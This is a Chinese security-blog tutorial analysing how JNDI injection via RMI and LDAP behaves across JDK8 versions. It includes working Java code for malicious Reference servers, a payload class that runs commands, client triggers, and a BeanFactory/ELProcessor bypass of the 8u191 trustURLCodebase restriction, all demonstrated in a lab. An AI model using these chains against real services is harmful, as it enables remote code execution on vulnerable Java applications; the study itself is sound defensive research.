0x01 前言
=======

之前学习Fastjson的JDBCRowSetImpl利用链的时候就是最后的触发点就是JNDI注入触发任意命令执行的，以及前不久比较火的Log4j2的漏洞的最后触发点也是JNDI注入，包括在weblogic里的T3反序列化中也存在利用JNDI为Sink点的利用链（CVE-2018-3191、CVE-2020-1464、CVE-2020-2551）等，其实在使用JNDI作为利用条件的时候，对JDK版本是有限制的，高版本中即使漏洞存在，可能也会无法利用的情况，  
所以此文主要内容：从JDK角度去分析JNDI注入在jdk8各个版本中情况。

0x02 JNDI相关知识
=============

关于jndi是什么网上一堆相关的文章，这里我们不做过多描述，参考官方给出的定义：

Java Naming and Directory Interface™ (JNDI) 是一个应用程序编程接口 (API)，它为使用 Java™ 编程语言编写的应用程序提供命名和目录功能。它被定义为独立于任何特定的目录服务实现。因此，各种目录都可以以一种通用的方式访问。

如下图是JNDI的主要框架，主要就是两部分，一个是最下面的服务提供者，一个是java里面jndi api：

![jndiarch.gif](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-852e3dd77effb4a079cb8f4d551081129338da18.gif)

一般来说比较常见的是:

- 轻量级目录访问协议 (LDAP)
- 通用对象请求代理架构 (CORBA) 通用对象服务 (COS) 名称服务
- Java 远程方法调用 (RMI) 注册表
- 域名服务 (DNS)

0x03 JNDI注入
===========

接下来我们使用jdk8这个版本作为环境，从jdk角度来看jndi注入的情况

1、JDK Version&lt;8u121
----------------------

这里我们随意选一个版本小于8u121的jdk测试，如:

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-5d88195c6fb251b1c9c738851213ae4f03854ae6.png)

先看看rmi和jndi的搭配使用：

首先创建一个rmi服务:

```php
package priv.ga0weI;  
​  
import com.sun.jndi.rmi.registry.ReferenceWrapper;  
​  
import javax.naming.Reference;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
​  
public class Rmiserver {  
    public static void main(String\[\] args)throws Exception {  
​  
        //在本机1099端口开启rmi registry。  
        Registry registry \= LocateRegistry.createRegistry(1099);  
        //配置一个reference  
        //第一个参数是className  
        //第二个参数指定 Object Factory的类名,第三个参数是codebase，如果Object Factory在classpath 里面找不到则去codebase下载。  
        //Object Factory类指定需要注意包路径，根据你的实际情况决定是否需要添加包名前缀。  
        Reference reference \= new Reference("EvalClass2", "EvalClass2","http://127.0.0.1:8888");  
        ReferenceWrapper referenceWrapper \= new ReferenceWrapper(reference);  
//        绑定远程对像到Exploit，实际上就是给Hashtable里面put这个key和value。  
        registry.bind("Exploit",referenceWrapper);  
    }  
}  
​
```

简单概括下上述代码：起一个Registry注册中心，构造一个reference对象绑定到对应的注册中心，并命名为Exploit；

构造reference对象的时候传入的三个变量指向一个远程的恶意类地址以及其类名，所以这里我们在起服务之前要先准备好对应恶意类：

恶意类：恶意类在准备的时候，这里我们可以将恶意的代码放到两个部分，初始代码里面，或者构造方法里面都可以，最终都会被执行，只不过是先后顺序，一般在loadclass里面的调用Class.forName的时候传入了true就会触发初始化，而构造方法则在newInstance的时候触发。

```php
public class EvalClass2 {  
    static {  
        try{  
           Runtime.getRuntime().exec("calc");  
        }catch (Exception e){  
            System.out.println(e);  
        }  
​  
    }  
    public  EvalClass2(){}  
}
```

起个web服务将恶意类放上去：这里可以直接使用python直接在本地起，也可以将对应的class放我们的vps上。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ba6277cb810d6e156f715ede6414a82285f559b9.png)

然后直接运行服务端代码：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-300fefa8af8f1e48460512b11850853a8430a470.png)

服务起来之后，我们再弄个Jndi客户端：

```php
package priv.ga0weI;  
​  
import javax.naming.InitialContext;  
​  
public class Jndiclient {  
    public static void main(String\[\] args)throws  Exception {  
        InitialContext initialContext \= new InitialContext();  
        initialContext.lookup("rmi://127.0.0.1:1099/Exploit");  
​  
    }  
}  
​
```

运行客户端：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-1390ec21bd913ef95ee4791f40af7e962ce29f9a.png)

恶意类里面的代码便被执行了，弹出计算器，并报错，为什么会报错也很好理解，这里传入的EvalClass2这个类并不是jndi里面想要的Factory类，从报错内容来看可以看出这里原本想要得到的类是一个继承了javax.naming.spi.ObjectFactory类的类。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-18e24d4cdc4f0cb6163fa31f74506ca53e957b9d.png)

接下来我们来看看JNDI客户端里面怎么触发的加载类:

整个的调用链如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-42247380a9d6dfa2d33c76af0431612e8ef907e1.png)

简单分析下，在客户端中我们调用InitalContext类lookup方法查找rmi对象，跟进到GenericURLContext的lookup方法里面：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-b46e73225164d9e3407ffa0ad2cb4815b01eb0b4.png)

上图中很清楚看出，当传入的rmi形式的参数的时候，最终是调用RegistryContext的lookup来实现的，继续跟进，如下图，可以看到在RegistryContext里面的lookup中会调用registry.lookup方法从而获取到我们构造的ReferenceWrapper对象，然后调用this.decodeObject来处理该对象：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-e8fcd2e3fb9b5f813359bc6acd31734abd24cec4.png)

跟进decodeObject方法的实现，如下图，里面对传入的对象类型进行了判断，如果是一个Reference对象，就调用NamingManager.getObjectInstance()的方式来获取到相关对象的实例，不妨想一下这里是想获取到什么对象的实例呢？

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c39ba5f6e632a0b7640e8ff643ce7e501db4214c.png)

跟进NamingManager.getObjectInstance的实现：如下图，粗略读下代码其实是可以看出这个方法就是想要从我们传入的Reference对象中获取到一个ObjectFactory对象，其在304行到338行，就是判断当reference对象存在的时候尝试从refenence还原出对应的ObjectFactory对象。可以看到在319行的时候调用getObjectFactoryFormReference方法获取到factory对象。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8257818cd08cbbdbcb232b0966717ff7992d9fd3.png)

接下来，继续跟进getObjectFactoryFromReference()的实现：如下图，这个方法里面其实就是三部分，第一部分就是尝试使用本地的加载器来加载，其实就是Appclassloader，很明显本地肯定加载不到factoryName，因为这个factoryName是我们构造Reference对象的时候传入的恶意类的类名，即EvalClass2。第二部分则是判断对应的reference对象里面有没有传入codebase即（factoryLocation），如果传入了就调用helper.loadClass(name,codebase)来实现。第三部分就是获取到对应类之后调用newInstance获取类的实例。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8a487c7159ee5d5ab516b5cfae252b8f7dbac850.png)

这里我们详细看看，第二部分中的helper.loadClass(name,codebase)怎么实现的：如下图，这里新创建了一个URLClassloader去加载className

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-bbd98430932018debb5ae36332542ffada11439b.png)

继续跟进调用的loadClass方法：如下图，其实就是直接Class.forName并传入了true，所以这里会做初始化，如果我们在恶意类里面的相关命令执行的代码写到的是初始化模块里面，则在这里就会触发了，如果是在构造方法里面写的相关命令执行的代码则是在newInstance里面触发。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-fcd833a3fd738923228cad71a8998c1c203630b9.png)

可以看下现在其cl，这个URLClassLoader对象：如下图，所以这里是去对应地址去加载了

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-0fc9b5a760fee9e27868e25c250bb03b9f2648c9.png)

至此代码就分析的差不多了。

2、8u121&lt;JDK Version&lt;8u191
-------------------------------

在jdk8u121之后Oracle对上述利用JNDI-rmi实现的任意代码执行做了相关修复，准确的说应该是做了相关限制。

这里实验的时候选jdk环境：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ee399268b97935322a7edee2aef3d88813b19ef5.png)

我们使用相同方法测试下，在8u151中能否实现任意代码执行：如下图，测试会报错，报错内容说在decoderObject方法里面抛出了ConfigurationException异常：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-acf98d94b3d5bf91e058d6253eb2a7ab3cbc395e.png)

我们跟进RegistryContext的decodeObject的实现：如下图，抛出的异常点是trustURLCodebase的属性是false，然后我们可以回去看下上文在分析8u121之前版本的时候，其RegistryContext的decodeObject的实现里面是没有这个trustURLCodebase的，所以这里就是Oracle新增的一个拦截点。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-76517153d68b7878cbcf1465331785f1e2cc9ceb.png)

然后我们看看trustURLCodebase这个变量是在哪来的：如下图，可以看到这个变脸从刚开始就默认是false的，所以说，这里就相当于不再允许通过codebase的方法来加载。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-dd06b3149a068b25abc3d7f88cae2b81a2278672.png)

稍作总结：Oracle2016年的时候在jdk 8u121中的RegistryContext类的decodeObject方法中切断了rmi的利用的链。（其实相同的方式也在corba里面切断了coba的利用链）

在RMI链和corba链被切断之后，ldap被相关安全从业者发现了同样存在相同的问题：

**接下来我们来看看jndi-ldap怎么搭配使用的：**

ldap本身是一个和域访问相关的协议，和rmi不同，rmi server我们可以通过很简单的一行代码（Registry registry = LocateRegistry.createRegistry(1099);）就开启了一个rmi服务。当然肯定也是可以通过java来实现一个ldap server的实现的，这里不是我们关注的重点，所以这里我们使用一款工具来开启ldap 服务：

工具：Apache Directory Studio 下载链接：<https://directory.apache.org/studio/download/download-windows.html>

正常下载安装即可，需要注意的是，这个程序运行的时候需要jdk11及以上的jdk依赖。

这里我选择在装在自己的一个Window10虚拟机上了：虚拟机地址：192.168.129.134

使用该工具起一个ldapserver：端口啥的直接使用默认的就行，这里默认server使用的端口是10389

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-1453894465891e6f6dcc203d319c9a6b783044a3.png)

然后同样使用这个工具，创建一个新的Connections连接：如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-7a78a5bf243ae64379d4e26265453719888a35fa.png)

LDAP服务起来之后，我们要在LDAP服务上绑定我们构造的恶意类：

```php
package priv.ga0weI;  
​  
import com.sun.jndi.rmi.registry.ReferenceWrapper;  
​  
import javax.naming.InitialContext;  
import javax.naming.Reference;  
​  
public class LdapServer {  
    public static void main(String\[\] args) throws Exception{  
        InitialContext initialContext \= new InitialContext();  
        Reference reference \= new Reference("EvalClass2", "EvalClass2","http://127.0.0.1:8888/");  
        ReferenceWrapper referenceWrapper \= new ReferenceWrapper(reference);  
        //这里cn随便写就行，后面dc和创建的ldap服务里面要保持一致  
        initialContext.bind("ldap://192.168.129.134:10389/cn=ga0weI,dc=example,dc=com",reference);  
    }  
}  
​
```

运行绑定的程序：如下图，可以看到这里相关内容已经被绑定了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-93b575ac2bbad028b68e7472a67993bdb89b138c.png)

接下来我们使用jndi客户端如下：

```php
package priv.ga0weI;  
​  
import javax.naming.InitialContext;  
​  
public class Jndiclient {  
    public static void main(String\[\] args)throws  Exception {  
        InitialContext initialContext \= new InitialContext();  
        initialContext.lookup("ldap://192.168.129.134:10389/cn=ga0weI,dc=example,dc=com");  
​  
    }  
}
```

运行客户端之后，如下图，触发命令执行代码，并报错

这里我们调试下客户端的代码：

直接来看看整个过程的栈：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-fb1f4d9c32f4fb1606fb3f60c691a28359c317f8.png)

简单概述下上述调用栈过程，InitialContext的lookup方法，当传入的是一个ldap形式的参数的时候，会调用IdapURLContext对象的lookup方法来处理，最终是在LdapCtx类里面调用c\_lookup里面实现的，最后从reference里面获取到对应的Factory对象还是使用NamingManager里面的getObjectFactoryFromReference放来获取的。所以最后的触发和rmi其实是一模一样的。

其实最关键的点就是在LdapCtx里面的c\_lookup方法：

这里我们先介绍下ldap里面支持绑定的java模型：

- 序列化对象
- JNDI Reference
- Marshalled对象
- Remote Location

在c\_lookup方法里面会对相关模型进行判断，判断传入的是什么，从而调用相关逻辑去实现。这里我们常规的利用思路就还是Reference和之前的rmi一样。所以就不做过多解释了，下面我们讲bypass的手法的时候再来详细看看这个方法的实现逻辑。

3、 8u191&lt;JDK Version
-----------------------

Oracle在8u191对jndi-ldap的利用方式进行了修复，我们这里还是先换一个高于8u191的版本环境，继续使用之前的方法测试。

jdk版本：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-f09497b0a8685d50592820ea7a986ecad306618b.png)

运行客户端之后发现，什么都显示，代码没有被执行，也没有报错抛出异常。

更进调试发现问题如下：如下图，在调用helper.loadClass的时候，其实现里面增加了一个if判断，对trustURLCodebase进行了判断。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-1cb4cc1af4b4a97bd2bfbdfeade2e4feaea2e82e.png)

接下来跟进下trustURLCodebase的值在哪被赋值的：如下图，可以看到这个值其实就是`com.sun.jndi.ldap.object.trustURLCodebase`属性，并且这个值默认为false，所以上图中loadClass方法里面的判断就不成立，返回null，也不会抛出异常。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8fcaa47ae964fcd7729f111204ba2c80df8d0441.png)

分析bypass 8u121中对rmi的限制和8u191中对ldap的限制，汇总流程图：如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-973e934979e30589ee96c909840d486250b21a02.png)

其实不难看出，对于上述两个修复存在一个通用的风险点的，那就是传入的Reference对象里面不存在FactoryLocation属性的且本地能加载对应的ClassName，并且ClassName还原的Factory对象的getObjectInstance方法存在Sink点。

回顾下常见的sink点：

1、直接存在Runtime.getRuntime.exec或Process，且参数可控

2、存在写文件操作的地方，且参数可控

3、反射任意方法调用method.invoke，参数可控

4、EL表达式渲染 直接eval执行，参数可控

5、特殊属性的类加载，属性字节码可控

所以我们可以在上述的风险点尝试寻找上述的sink点，说白了就是看哪个实现了ObjectFactory接口的类，在其getObjectInstance方法里面存在上述的四个sink点操作。

我们简单看下这个接口：如下图，其实现类如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-852d92cc84e3cd4935a4c52d9f9f2bf41de28a33.png)

后来找到能够利用的类，绕过方式中最常用的有BeanFactory和ELProcessor搭配使用，

我们先来看看BeanFactory的getObjectInstance方法，如下图，可以看到存在反射方法调用的sink点，这个方法前面有一大堆的处理逻辑，我们可能要通过一些格式的构造才能触发这里的反射方法调用，这个构造我们一会再看。我们先来分析下这个反射调用的是什么方法：其中valueArray是一个String类型的变量，所以这里我们要找一个只用一个String参数就能实现命令执行的方法，然后想办法构造，使其对象在getObjectInstance中被还原并调用该方法，传入命令执行的参数:（其实还有其他的限制，比如这个方法要是public属性的，因为在上面我们是通过getMethod获取method的）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-726770cbdb25f1e150f34340848b40ce1e62384b.png)

按照上面的思路，我们找到的是Tomcat下的ELProcessor类，其eval方法，传入一个String类就可以直接渲染执行命令:如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-131966f488b0bae156e5ce1a0ce41c37335e8e20.png)

简单讲完为什么要用这个两个类搭配之后，我们来看看具体测试案例，以及如何构造：

首先上文提到的两个依赖其中BeanFactory是在tomcat-catalina包里面；ELProcessor是在tomcat-embed-el依赖里面

ELProcessor类是在Tomcat8才引入的，所以我们选取的实验环境要使用Tomcat8+的依赖，但是我在测试在tomcat8.5.79中并没有测试成功，然后改用了tomcat9.0.55版本，测试成功，依赖如下：

```php
        <dependency\>  
            <groupId\>org.apache.tomcat</groupId\>  
            <artifactId\>tomcat\-catalina</artifactId\>  
            <version\>9.0.55</version\>  
        </dependency\>  
        <dependency\>  
            <groupId\>org.apache.tomcat.embed</groupId\>  
            <artifactId\>tomcat\-embed\-el</artifactId\>  
            <version\>9.0.55</version\>  
        </dependency\>
```

这里测试的时候用RMI和LDAP是一样的，这里我拿RMI测试:

1、起RMIserver:

```php
package priv.ga0weI;  
​  
import com.sun.jndi.rmi.registry.ReferenceWrapper;  
import org.apache.naming.ResourceRef;  
import javax.naming.StringRefAddr;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
​  
public class BypassbyLocalClass {  
    public static void main(String\[\] args) throws Exception{  
        //在本机1099端口开启rmi registry。  
        Registry registry \= LocateRegistry.createRegistry(1099);  
        ResourceRef ref \= new ResourceRef("javax.el.ELProcessor",null,  
                "","",true,"org.apache.naming.factory.BeanFactory",null);  
        ref.add(new StringRefAddr("forceString","Ga0weI=eval"));  
        ref.add(new StringRefAddr("Ga0weI","Runtime.getRuntime().exec(\\"calc\\")"));  
        ReferenceWrapper referenceWrapper \= new ReferenceWrapper(ref);  
        registry.bind("Exploit",referenceWrapper);  
​  
    }  
​  
​  
}
```

简单分析上述代码：

在1099端口起一个注册中心，绑定一个构造的ResourceRef对象（严格说是ReferenceWrapper）,和之前的121之前的JNDI-rmi利用不一样，不是构造的Reference对象，而是一个ResourceRef对象，因为在BeanFactory的getObjectInstance方法里面只会对Resource进行处理。

2、JNDI客户端;

```php
package priv.ga0weI;  
​  
import javax.naming.InitialContext;  
​  
public class Jndiclient {  
    public static void main(String\[\] args)throws  Exception {  
        InitialContext initialContext \= new InitialContext();  
        initialContext.lookup("rmi://127.0.0.1:1099/Exploit");  
    }  
}
```

先起服务，再运行客户端：如下图，触发恶意代码执行

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-ba602859bb24001d2ddbc96c044a143c134fb5e3.png)

接下来我们先看下函数的调用栈:

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-650eb34d4d9c1e581a3a986dfbc3ad0935c2709f.png)

我们直接来看到BeanFactory里面的getObjectInstance实现，前面的和之前一样（ResourceRef是Reference的子类），因为本地存在BeanFactory依赖，所以本地的AppClassLoader直接就加载到了BeanFactory对象，获取其实例之后调用getObjectInstance方法：

如下图，在getObjectInstance方法里面首先就是判断传入对象的类型是否为ResourceRef对象，这也是为什么我们之前构造的是ResourceRef对象

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-959e003adb36bf17c0540077ae7a488685caebfc.png)

然后将其强转成Reference对象，获取其className属性（其实就是我们构造时传入的javax.el.ELProcessor）,通过AppClassLoader加载获取到其Class对象

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-499ba6ce95d7253b744985283a94f4b30372c60a.png)

然后获取到其实例对象并命名为bean：如下图

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-1f8ee7bbcc6c2cfa264ade1932e913c2bd0a49b8.png)

接下来，对Reference里面的forceString内容进行如下处理，如下图，最终得到的method是eval，参数param是等号之前的参数：Ga0weI。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-621ca2d6d5c2a4b3668e5ba12d9b7fbc27be7712.png)

然后通过一个循环取出Ga0weI对应的Context：如下图，其实就是我们想要执行的代码

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-8a9907ac94603ab63960364d4fb6bd37e8ef72d0.png)

最后通过之前的forced map将前面的eval Method取出来：如下图，并且当Method不为空的时候就直接利用反射调用之前的bean（ELProcessor）的method（eval）方法，并传入参数为RefAddr里面的Ga0weI参数的内容。从而触发任意代码执行。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-56e3aebec5b464e3cd881a1284254f5a5ce58936.png)

以上就是比较常规通用绕过方式，RMI协议和LDAP协议都可以使用。

0x04 总结（题外话）
============

- （投这篇文章的另一个目的，其实就是想尝尝补天的月饼，haha）
- 我发现学习的过程，其实就是一个不断扩大你的无知的一个过程，甚至有时候时常觉得学习本身就是个伪命题，学习的目的是什么，是为了求知，变得有知；但是现阶段的学习让我觉得越学越无知。以前上学的时候学过庄子的一句话："吾生也有涯，而知也无涯。以有涯随无涯，殆己"，我一直以为这句话是勉励我们好好学习天天向上，现在看似乎好像有了新的意境!  
    奇怪的想法又增加了！

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/08/attach-c14538d30c2687a4e178776c20e4b79feef98b16.png)

笔者才疏学浅，若文中存在错误观点，欢迎斧正。